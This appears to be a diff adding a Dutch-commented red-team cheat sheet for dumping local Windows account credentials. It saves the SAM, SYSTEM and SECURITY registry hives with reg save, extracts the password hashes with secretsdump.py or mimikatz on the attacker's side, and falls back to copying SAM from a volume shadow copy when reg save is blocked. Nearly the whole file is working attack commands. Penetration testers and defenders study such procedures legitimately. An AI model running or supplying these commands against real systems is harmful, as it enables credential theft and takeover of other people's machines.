@@ -1,0 +1,14 @@
+# SAM/SYSTEM/SECURITY registry hive dump - lokale accounts
+# Vereiste: Local admin
+# Stap 1: Dump registry hives
+reg save HKLM\SAM C:\Windows\tasks\sam.bak
+reg save HKLM\SYSTEM C:\Windows\tasks\system.bak
+reg save HKLM\SECURITY C:\Windows\tasks\security.bak
+# Stap 2: Download naar aanvaller en extract hashes
+# Op aanvaller met secretsdump:
+python3 secretsdump.py -sam sam.bak -system system.bak -security security.bak LOCAL
+# Of met mimikatz:
+# mimikatz # lsadump::sam /sam:sam.bak /system:system.bak
+# Alternatief: Volume Shadow Copy (als reg save geblokkeerd)
+wmic shadowcopy call create Volume='C:\'
+# Kopieer van shadow copy: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\tasks\sam.bak
